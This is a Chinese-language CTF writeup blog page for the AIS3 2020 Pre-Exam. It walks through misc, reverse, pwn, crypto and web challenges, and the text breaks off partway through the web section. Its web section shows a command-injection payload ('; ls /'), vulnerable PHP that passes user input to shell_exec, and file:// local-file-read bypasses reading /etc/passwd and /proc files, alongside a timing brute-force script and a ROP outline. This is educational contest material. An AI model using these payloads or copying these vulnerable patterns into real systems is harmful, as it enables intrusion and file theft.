@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-sena16x16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-sena32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-sena16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"twinklestar03.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="從接觸CTF到現在已經過了一年，在CTF的技術上的確進步了不少，但還有很長一段路要走呢! 結果Pwn沒解掉幾題，花大部分時間在看web…事後看了pwn的題目才發現自己解的掉…早知道就先打PwnㄉQAQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3-2020 Pre-Exam Writeup">
+<meta property="og:url" content="https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/index.html">
+<meta property="og:site_name" content="Star Note">
+<meta property="og:description" content="從接觸CTF到現在已經過了一年，在CTF的技術上的確進步了不少，但還有很長一段路要走呢! 結果Pwn沒解掉幾題，花大部分時間在看web…事後看了pwn的題目才發現自己解的掉…早知道就先打PwnㄉQAQ">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://twinklestar03.com/images/AIS3_2020_Pre-Exam/Karuego.png">
+<meta property="og:image" content="https://twinklestar03.com/images/AIS3_2020_Pre-Exam/Demon.png">
+<meta property="og:image" content="https://twinklestar03.com/images/AIS3_2020_Pre-Exam/Soy.png">
+<meta property="og:image" content="https://twinklestar03.com/images/AIS3_2020_Pre-Exam/QRazyBox.png">
+<meta property="article:published_time" content="2020-06-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-12-18T07:36:23.813Z">
+<meta property="article:author" content="TwinkleStar03">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="AIS3 Pre-Exam">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twinklestar03.com/images/AIS3_2020_Pre-Exam/Karuego.png">
+
+<link rel="canonical" href="https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>AIS3-2020 Pre-Exam Writeup | Star Note</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-142199198-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-142199198-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Star Note" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Star Note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">星筆記</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>歸檔</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://twinklestar03.com/Contest/CTF/AIS3_2020_Pre-Exam_Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_sena.png">
+      <meta itemprop="name" content="TwinkleStar03">
+      <meta itemprop="description" content="日常的學習紀錄d(`･∀･)b<br><br>Pwning my world٩(ŏ﹏ŏ、)۶<br>New CTFer.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Star Note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AIS3-2020 Pre-Exam Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+
+              <time title="創建時間：2020-06-20 00:00:00" itemprop="dateCreated datePublished" datetime="2020-06-20T00:00:00+08:00">2020-06-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2020-12-18 15:36:23" itemprop="dateModified" datetime="2020-12-18T15:36:23+08:00">2020-12-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分類於</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>從接觸CTF到現在已經過了一年，在CTF的技術上的確進步了不少，但還有很長一段路要走呢!</p>
+<p>結果Pwn沒解掉幾題，花大部分時間在看web…事後看了pwn的題目才發現自己解的掉…早知道就先打PwnㄉQAQ</p>
+<a id="more"></a>
+
+
+<p>這次解掉的題目…</p>
+<ul>
+<li><p>🐧Misc</p>
+<ul>
+<li>💤Piquero</li>
+<li>🐥Karuego</li>
+<li>🌱Soy</li>
+<li>👑Saburo</li>
+</ul>
+</li>
+<li><p>♻️Reverse</p>
+<ul>
+<li>🍍TsaiBro</li>
+<li>🎹Fallen Beat</li>
+</ul>
+</li>
+<li><p>💥 Pwn</p>
+<ul>
+<li>👻 BOF</li>
+</ul>
+</li>
+<li><p>🙊 Crypto</p>
+<ul>
+<li>🦕 Brontosaurus</li>
+<li>🦖 T-Rex</li>
+</ul>
+</li>
+<li><p>🌐Web</p>
+<ul>
+<li>🐿️Squirrel</li>
+<li>🦈Shark</li>
+<li>🐘Elephant</li>
+<li>🐍Snake</li>
+<li>🦉Owl</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="🐧Misc"><a href="#🐧Misc" class="headerlink" title="🐧Misc"></a>🐧Misc</h2><h3 id="💤Piquero"><a href="#💤Piquero" class="headerlink" title="💤Piquero"></a>💤Piquero</h3><p>盲人點字，找表找了很久，然後一個一個字慢慢對…</p>
+<p>Flag: <code>AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</code></p>
+<h3 id="🐥Karuego"><a href="#🐥Karuego" class="headerlink" title="🐥Karuego"></a>🐥Karuego</h3><p>拿到一張圖片:<br><img src="/images/AIS3_2020_Pre-Exam/Karuego.png" alt="Karuego.png"></p>
+<p>感覺圖片裡面有放東西，先拿去binwalk…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 2880 x 1492, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files&#x2F;</span><br><span class="line">2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files&#x2F;3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg</span><br><span class="line">2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files&#x2F;Demon.png</span><br><span class="line">3260899       0x31C1E3        End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>
+<p>裏頭的確有東西，<code>binwalk -e</code> extract出來，之後看到一個被鎖起來的zip，不知道怎麼找密碼就用fcrackzip把密碼炸出來，之後就拿到帶有flag的圖片。</p>
+<p><img src="/images/AIS3_2020_Pre-Exam/Demon.png" alt="Demon.png"></p>
+<h3 id="🌱Soy"><a href="#🌱Soy" class="headerlink" title="🌱Soy"></a>🌱Soy</h3><p>拿到一張失去一部分的QRCode</p>
+<p><img src="/images/AIS3_2020_Pre-Exam/Soy.png" alt="Soy.png"></p>
+<p>找了找網路資源找到了關於QRCode復原的<a target="_blank" rel="noopener" href="https://www.robertxiao.ca/hacking/ctf-writeup/mma2015-qrcode/">文章</a>，順著文章研究了QRCode的運作方式後，我用QRazyBox這個工具在上面一個一個像素點出來，之後讓他配合error Correction來把完整資訊extract出來</p>
+<p><img src="/images/AIS3_2020_Pre-Exam/QRazyBox.png" alt="QRazyBox">  </p>
+<p>Flag: <code> AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</code></p>
+<h3 id="👑Saburo"><a href="#👑Saburo" class="headerlink" title="👑Saburo"></a>👑Saburo</h3><p>拿到一個位置，nc上去之後稍微摸索後發現: 只要送出的字串跟Flag部分相同的話就會回傳更大的時間，但是這個時間前後有點誤差，而且長度越長它誤差越大，所以我選擇多傳幾次然後取平均值來決定這個是不是正確的字元。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 26 milliseconds.</span><br><span class="line">---</span><br><span class="line">Flag: AI</span><br><span class="line">Haha, you lose in 37 milliseconds.</span><br><span class="line">---</span><br><span class="line">Flag: AIS</span><br><span class="line">Haha, you lose in 55 milliseconds.</span><br></pre></td></tr></table></figure>
+<p>所以我寫了一個Python腳本來幫我拼出Flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag_it</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;AIS3&#123;&#x27;</span></span><br><span class="line">    pre_avg = <span class="number">75</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_set:</span><br><span class="line">            tmp_flag = flag + c</span><br><span class="line">            avg = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">                avg.append(send(tmp_flag))</span><br><span class="line">            avg = <span class="built_in">sum</span>(avg) / <span class="built_in">len</span>(avg)</span><br><span class="line">            print(<span class="string">&#x27;Now: &#123;&#125;, Now_Avg: &#123;&#125;, Pre_Avg: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c, avg, pre_avg))</span><br><span class="line">            <span class="keyword">if</span> avg &gt; pre_avg:</span><br><span class="line">                pre_avg = avg + <span class="number">5</span></span><br><span class="line">                flag = tmp_flag</span><br><span class="line">                print(<span class="string">&#x27;Found one char! Flag:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Flag: <code>AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</code></p>
+<hr>
+<h2 id="♻️Reverse"><a href="#♻️Reverse" class="headerlink" title="♻️Reverse"></a>♻️Reverse</h2><h3 id="🍍TsaiBro"><a href="#🍍TsaiBro" class="headerlink" title="🍍TsaiBro"></a>🍍TsaiBro</h3><p>一開始拿到一個binary跟一個txt，binary會根據參數來印出對應的密文<br>因為懶惰所以沒有去逆向那個binary，反而直接蓋一個對照表起來，最後寫個腳本把Flag找出來…</p>
+<p>Flag: <code>AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</code></p>
+<h3 id="🎹Fallen-Beat"><a href="#🎹Fallen-Beat" class="headerlink" title="🎹Fallen Beat"></a>🎹Fallen Beat</h3><p>拿到一個Jar做的音G，音樂動人(?</p>
+<p>拿去餵給jd-gui去逆向來看看flag的邏輯，然後在<code>PanelEnding.class</code>裏頭找到Flag的陣列。<br>繼續往下找可以找到解密Flag的邏輯，最後找到cache來對這個陣列做XOR就可以找出Flag了!<br>Cache是<code>songs/gekkou/hell</code>這個看起來像是譜面的東西，實際上裏頭裝著Cache會載入的東西。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] flag = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; </span><br><span class="line">      <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">      <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">      <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">      <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] = (<span class="keyword">byte</span>)(<span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue()); </span><br><span class="line">      String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">      <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">&quot;Flag: %s&quot;</span>, <span class="keyword">new</span> Object[] &#123; fff &#125;));</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>寫個腳本把Flag XOR回來。</p>
+<p>Flag: <code>AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</code></p>
+<hr>
+<h2 id="💥-Pwn"><a href="#💥-Pwn" class="headerlink" title="💥 Pwn"></a>💥 Pwn</h2><h3 id="👻-BOF"><a href="#👻-BOF" class="headerlink" title="👻 BOF"></a>👻 BOF</h3><p>有BufferOverflow的洞。</p>
+<p>沒有在binary中找到可以直接開shell的函數，但是有<code>system@plt</code>可以用。<br>在64bit下透過register傳參數，所以找個可以<code>pop rdi; ret</code>的gadget來用就可以控制system的第一個參數了。</p>
+<p>第一個參數要求的型態是<code>char[]</code>，直接填<code>&quot;/bin/sh&quot;</code>是沒辦法getshell的，在binary中有找到一個可以寫的.bss區域，配合<code>gets@plt</code>就可在那個位置寫<code>&quot;/bin/sh&quot;</code>，最後把該位置當參數傳給<code>system</code>就可以getshell了。</p>
+<hr>
+<h2 id="🙊-Crypto"><a href="#🙊-Crypto" class="headerlink" title="🙊 Crypto"></a>🙊 Crypto</h2><h3 id="🦕-Brontosaurus"><a href="#🦕-Brontosaurus" class="headerlink" title="🦕 Brontosaurus"></a>🦕 Brontosaurus</h3><p>恩…JSFuck，倒轉然後拿去console跑</p>
+<p>Flag: ``</p>
+<h3 id="🦖-T-Rex"><a href="#🦖-T-Rex" class="headerlink" title="🦖 T-Rex"></a>🦖 T-Rex</h3><p>給了對照表，直接Find+Replace把flag還原出來。</p>
+<p>Flag: <code>AIS3&#123;TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX&#125;</code></p>
+<hr>
+<h2 id="🌐Web"><a href="#🌐Web" class="headerlink" title="🌐Web"></a>🌐Web</h2><h3 id="🐿️Squirrel"><a href="#🐿️Squirrel" class="headerlink" title="🐿️Squirrel"></a>🐿️Squirrel</h3><p>進到<code>https://squirrel.ais3.org/</code>看到一堆松鼠，翻了翻網頁找到了這段Javascript:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">const</span> squirrelFile = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&#x27;api.php?get=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(squirrelFile))</span><br><span class="line">      .then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> data) &#123;</span><br><span class="line">          <span class="keyword">throw</span> data.error;</span><br><span class="line">        &#125;</span><br><span class="line">        data.output.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">          .map(<span class="function"><span class="params">line</span> =&gt;</span> line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].trim())</span><br><span class="line">          .filter(<span class="function"><span class="params">name</span> =&gt;</span> name.length)</span><br><span class="line">          .forEach(<span class="function"><span class="params">name</span> =&gt;</span> <span class="keyword">new</span> Squirrel(name).update());</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        alert(<span class="string">&#x27;Something went wrong! Please report this to the author!&#x27;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>找到了一個會列出檔案的網頁: <code>https://squirrel.ais3.org/api.php</code>然後用<code>?get</code>來傳要列出的檔案，感覺可以做到arbritrary file read，所以就先看看能不能列出<code>api.php</code>它自己。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($file = @$_GET[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line">    $output = shell_exec(<span class="string">&quot;cat &#x27;$file&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($output !== <span class="literal">null</span>) &#123;</span><br><span class="line">        echo json_encode([</span><br><span class="line">            <span class="string">&#x27;output&#x27;</span> =&gt; $output</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo json_encode([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;cannot get file&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo json_encode([</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;empty file path&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>洩漏完原碼後發現有command injection的洞，所以就構造了<code>?get=&#39;; ls /&#39;</code>先對root做ls，得到以下內容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+<p>那個<code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code>看起來像Flag，所以就送<code>?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code>讀看看，就拿到Flag了。</p>
+<p>Flag: <code>AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</code></p>
+<h3 id="🦈Shark"><a href="#🦈Shark" class="headerlink" title="🦈Shark"></a>🦈Shark</h3><p>進到網頁後看到有個Hint可以點，Hint說Flag在某個內部伺服器，順便發現Hint是用<code>?path=</code>讀出來的，感覺有LFI的漏洞可以用…<br>所以就直接輸入<code>?path=index.php</code>看看能不能看到原始碼。</p>
+<p>成功洩漏原碼後看到這段，過濾了一些符號，但還是可以用<code>file://</code>進行繞過來任意讀檔。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(\.|\/)/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;[forbidden]&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$path</span>, <span class="literal">FALSE</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . (<span class="variable">$content</span> ? htmlentities(<span class="variable">$content</span>) : <span class="string">&#x27;[empty]&#x27;</span>) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因為說Flag運行在內部的伺服器內，所以我構造<code>?path=file:///proc/self/net/fib_trie</code>去讀了網路樹狀圖(?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">  +-- 0.0.0.0&#x2F;0 3 0 5</span><br><span class="line">     |-- 0.0.0.0</span><br><span class="line">        &#x2F;0 universe UNICAST</span><br><span class="line">     +-- 127.0.0.0&#x2F;8 2 0 2</span><br><span class="line">        +-- 127.0.0.0&#x2F;31 1 0 0</span><br><span class="line">           |-- 127.0.0.0</span><br><span class="line">              &#x2F;32 link BROADCAST</span><br><span class="line">              &#x2F;8 host LOCAL</span><br><span class="line">           |-- 127.0.0.1</span><br><span class="line">              &#x2F;32 host LOCAL</span><br><span class="line">        |-- 127.255.255.255</span><br><span class="line">           &#x2F;32 link BROADCAST</span><br><span class="line">     +-- 172.22.0.0&#x2F;16 2 0 2</span><br><span class="line">        +-- 172.22.0.0&#x2F;30 2 0 2</span><br><span class="line">           |-- 172.22.0.0</span><br><span class="line">              &#x2F;32 link BROADCAST</span><br><span class="line">              &#x2F;16 link UNICAST</span><br><span class="line">           |-- 172.22.0.3</span><br><span class="line">              &#x2F;32 host 